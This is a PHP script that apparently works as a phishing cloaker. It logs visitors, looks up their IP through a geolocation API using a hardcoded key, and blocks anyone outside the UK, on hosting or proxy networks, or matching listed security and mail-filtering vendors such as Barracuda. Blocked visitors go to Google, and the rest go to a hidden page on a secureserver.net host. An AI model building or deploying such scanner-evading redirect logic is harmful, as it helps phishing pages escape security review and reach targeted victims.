<?php
if (!function_exists('getUserIP')) {
    function getUserIP() {
        if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
            return $_SERVER['HTTP_CF_CONNECTING_IP'];
        }
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            return $_SERVER['HTTP_CLIENT_IP'];
        }
        if (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
            foreach ($ips as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                    return $ip;
                }
            }
            return trim($ips[0]);
        }
        if (!empty($_SERVER['HTTP_X_REAL_IP'])) {
            return $_SERVER['HTTP_X_REAL_IP'];
        }
        return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
    }
}

if (!function_exists('getIPInfo')) {
    function getIPInfo($ip) {
        if (!filter_var($ip, FILTER_VALIDATE_IP)) {
            return false;
        }
        
        $apiKey = 'JFLQHVz4gun5Lqz';
        $apiEndpoint = "https://pro.ip-api.com/json/{$ip}?fields=status,country,countryCode,isp,hosting,proxy,query&key={$apiKey}";
        
        if (function_exists('curl_init')) {
            $ch = curl_init();
            curl_setopt_array($ch, [
                CURLOPT_URL => $apiEndpoint,
                CURLOPT_RETURNTRANSFER => 1,
                CURLOPT_TIMEOUT => 3,
                CURLOPT_CONNECTTIMEOUT => 2,
                CURLOPT_SSL_VERIFYPEER => false,
                CURLOPT_USERAGENT => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            ]);
            
            $apiResponse = curl_exec($ch);
            $httpStatus = curl_getinfo($ch, CURLINFO_HTTP_CODE);
            curl_close($ch);
            
            if ($httpStatus === 200 && $apiResponse) {
                return json_decode($apiResponse, true);
            }
        }
        
        $context = stream_context_create([
            'http' => [
                'timeout' => 3,
                'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            ],
            'ssl' => [
                'verify_peer' => false,
                'verify_peer_name' => false
            ]
        ]);
        
        $apiResponse = @file_get_contents($apiEndpoint, false, $context);
        if ($apiResponse !== false) {
            return json_decode($apiResponse, true);
        }
        
        return false;
    }
}

function readJSONFile($filename) {
    if (!file_exists($filename)) {
        return [];
    }
    
    $fp = fopen($filename, 'r');
    if (!$fp) {
        return [];
    }
    
    if (flock($fp, LOCK_SH)) {
        $content = stream_get_contents($fp);
        flock($fp, LOCK_UN);
        fclose($fp);
        
        if (empty($content)) {
            return [];
        }
        
        $data = json_decode($content, true);
        if (is_array($data)) {
            return $data;
        }
        
        $backupFile = $filename . '.backup.' . date('YmdHis');
        @copy($filename, $backupFile);
        
        return [];
    }
    
    fclose($fp);
    return [];
}

function writeJSONFile($filename, $data) {
    if (!is_array($data)) {
        return false;
    }
    
    $fp = fopen($filename, 'c');
    if (!$fp) {
        return false;
    }
    
    if (flock($fp, LOCK_EX)) {
        $jsonData = json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
        if ($jsonData === false) {
            flock($fp, LOCK_UN);
            fclose($fp);
            return false;
        }
        
        $testDecode = json_decode($jsonData, true);
        if (!is_array($testDecode)) {
            flock($fp, LOCK_UN);
            fclose($fp);
            return false;
        }
        
        ftruncate($fp, 0);
        fwrite($fp, $jsonData);
        fflush($fp);
        flock($fp, LOCK_UN);
        fclose($fp);
        return true;
    }
    
    fclose($fp);
    return false;
}

$ip = getUserIP();
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$logFile = 'visits.json';
$blockedIPsFile = 'blocked_ips.json';
$blockedISPsFile = 'blocked_isps.json';

if (!file_exists($logFile)) {
    writeJSONFile($logFile, []);
}
if (!file_exists($blockedIPsFile)) {
    writeJSONFile($blockedIPsFile, []);
}
if (!file_exists($blockedISPsFile)) {
    writeJSONFile($blockedISPsFile, []);
}

$hostname = 'Unknown';
if (filter_var($ip, FILTER_VALIDATE_IP)) {
    $reverseDns = @gethostbyaddr($ip);
    $hostname = ($reverseDns && $reverseDns !== $ip) ? strtolower($reverseDns) : 'Unknown';
}

$ipInfo = getIPInfo($ip);
$apiStatus = 'SUCCESS';

$isp = 'Unknown';
$country = 'Unknown';
$countryCode = 'Unknown';
$isHosting = false;
$isProxy = false;

if ($ipInfo === false) {
    $apiStatus = 'FAILED';
} elseif (isset($ipInfo['status']) && $ipInfo['status'] === 'success') {
    $isp = strtolower($ipInfo['isp'] ?? 'Unknown');
    $country = $ipInfo['country'] ?? 'Unknown';
    $countryCode = $ipInfo['countryCode'] ?? 'Unknown';
    $isHosting = $ipInfo['hosting'] ?? false;
    $isProxy = $ipInfo['proxy'] ?? false;
}

$blockedPatterns = [
    'code200.global',
    'backbone.de',
    'rzone.de',
    '.amazonaws.com',
    '.googleusercontent.com',
    '.secumail.de',
    '.google.com',
    'amazon',
    '.barracuda.com',
    'antispameurope-net'
];

$blockedIPs = readJSONFile($blockedIPsFile);
$blockedISPs = readJSONFile($blockedISPsFile);

$isBlocked = false;
$blockReason = '';

if (in_array($ip, $blockedIPs)) {
    $isBlocked = true;
    $blockReason = 'MANUAL_BLOCK';
} elseif ($apiStatus === 'SUCCESS' && isset($ipInfo['status']) && $ipInfo['status'] === 'success') {
    if ($countryCode !== 'GB') {
        $isBlocked = true;
        $blockReason = 'COUNTRY_BLOCK';
    } elseif ($isHosting || $isProxy) {
        $isBlocked = true;
        $blockReason = 'HOSTING_PROXY';
    }
} elseif ($apiStatus === 'FAILED') {
    $isBlocked = false;
    $blockReason = '';
}

if (!$isBlocked && $apiStatus === 'SUCCESS' && $hostname !== 'Unknown') {
    foreach ($blockedPatterns as $pattern) {
        if (strpos($hostname, $pattern) !== false) {
            $isBlocked = true;
            $blockReason = 'HOSTNAME_BLOCK';
            break;
        }
    }
}

if (!$isBlocked && $apiStatus === 'SUCCESS' && $isp !== 'Unknown') {
    foreach ($blockedISPs as $blockedISP) {
        if (strpos($isp, strtolower($blockedISP)) !== false) {
            $isBlocked = true;
            $blockReason = 'ISP_BLOCK';
            break;
        }
    }
}

if (!$isBlocked && $apiStatus === 'SUCCESS' && $isp !== 'Unknown') {
    foreach ($blockedPatterns as $pattern) {
        if (strpos($isp, $pattern) !== false) {
            $isBlocked = true;
            $blockReason = 'ISP_BLOCK';
            break;
        }
    }
}

$logEntry = [
    'timestamp' => date('Y-m-d H:i:s'),
    'ip' => $ip,
    'hostname' => $hostname,
    'isp' => $isp,
    'country' => $country,
    'countryCode' => $countryCode,
    'userAgent' => $userAgent,
    'status' => $isBlocked ? 'BLOCKED' : 'ALLOWED',
    'reason' => $blockReason ?: '',
    'apiStatus' => $apiStatus
];

$logs = readJSONFile($logFile);

array_unshift($logs, $logEntry);
$logs = array_slice($logs, 0, 1000);

writeJSONFile($logFile, $logs);

if ($isBlocked) {
    header('Location: https://www.google.com/', true, 302);
    exit;
} else {
    if ($apiStatus === 'FAILED') {
        header('Location: https://www.google.com/', true, 302);
        exit;
    } else {
        header('Location: https://156.176.153.160.host.secureserver.net/ev/', true, 302);
        exit;
    }
}
?>